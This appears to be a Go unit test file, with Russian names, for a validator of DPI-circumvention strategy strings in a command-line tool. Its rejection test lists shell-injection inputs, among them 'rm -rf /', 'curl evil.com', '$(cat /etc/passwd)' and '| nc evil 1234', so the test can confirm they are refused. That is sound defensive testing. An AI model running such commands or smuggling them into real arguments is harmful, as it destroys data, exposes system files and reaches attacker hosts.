package cli

import (
	"strings"
	"testing"
)

func TestValidateDPIStrategy_Допустимые(t *testing.T) {
	ok := []string{
		"--dpi-desync=fake,split2",
		"--filter-tcp=443,80,1984,5222 --lua-desync=fake:blob=tls_clienthello",
		"--lua-desync=hostfakesplit:host=ozon.ru:strategy=3",
		"@preset/youtube",
		"file:///opt/etc/sign-craze/strategy.txt",
		"sni=fonts.google.com",
	}
	for _, s := range ok {
		t.Run(s, func(t *testing.T) {
			if err := validateDPIStrategy(s); err != nil {
				t.Fatalf("ожидалась успешная валидация, получено: %v", err)
			}
		})
	}
}

func TestValidateDPIStrategy_ЗапрещённыеСимволы(t *testing.T) {
	bad := map[string]string{
		"shell-injection-semicolon": "--dpi-desync=fake; rm -rf /",
		"shell-injection-amp":       "--dpi-desync=fake & curl evil.com",
		"command-substitution":      "--dpi-desync=$(cat /etc/passwd)",
		"backtick-command":          "--dpi-desync=`whoami`",
		"redirection":               "--dpi-desync=fake > /dev/null",
		"pipe":                      "--dpi-desync=fake | nc evil 1234",
		"newline":                   "--dpi-desync=fake\nnew-flag",
		"null-byte":                 "--dpi-desync=fake\x00",
		"open-paren":                "--dpi-desync=fake(1)",
	}
	for name, s := range bad {
		t.Run(name, func(t *testing.T) {
			err := validateDPIStrategy(s)
			if err == nil {
				t.Fatalf("ожидалась ошибка для %q", s)
			}
			if !strings.Contains(err.Error(), "запрещённый символ") {
				t.Fatalf("сообщение должно упомянуть 'запрещённый символ', получено: %v", err)
			}
		})
	}
}

func TestValidateDPIStrategy_Пустая(t *testing.T) {
	if err := validateDPIStrategy(""); err == nil {
		t.Fatal("ожидалась ошибка для пустой строки")
	}
}

func TestValidateDPIStrategy_СлишкомДлинная(t *testing.T) {
	long := strings.Repeat("a", dpiStrategyMaxLen+1)
	if err := validateDPIStrategy(long); err == nil {
		t.Fatal("ожидалась ошибка для строки длиннее лимита")
	}
}
